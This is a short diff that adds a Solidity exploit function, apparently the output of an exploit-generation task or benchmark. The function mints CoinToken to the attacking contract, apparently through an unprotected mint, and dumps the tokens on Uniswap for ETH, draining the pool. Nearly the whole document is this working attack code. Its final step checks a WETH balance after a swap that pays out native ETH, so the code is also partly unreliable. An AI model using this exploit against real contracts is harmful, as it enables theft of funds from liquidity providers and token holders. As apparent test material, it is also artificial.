@@ -1,0 +1,23 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Mint some CoinToken for the contract itself.
+    ICoinToken(token).mint(address(this), amount);
+
+    // Step 2: Get balance and swap CoinToken for WETH in Uniswap
+    uint256 tokenBalance = IERC20(token).balanceOf(address(this));
+    console.log("CoinToken balance before swap: %s", tokenBalance);
+    
+    address[] memory path = new address[](2);
+    path[0] = token; // CoinToken
+    path[1] = uniswapRouter.WETH(); // WETH
+
+    // Step 3: Swap CoinToken for WETH
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenBalance, 0, path, address(this), block.timestamp);
+
+    // Step 4: Check WETH balance after the swap
+    uint256 wethBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+    console.log("WETH balance after swap: %s", wethBalance);
+}
+</executeExploitCode>
+```
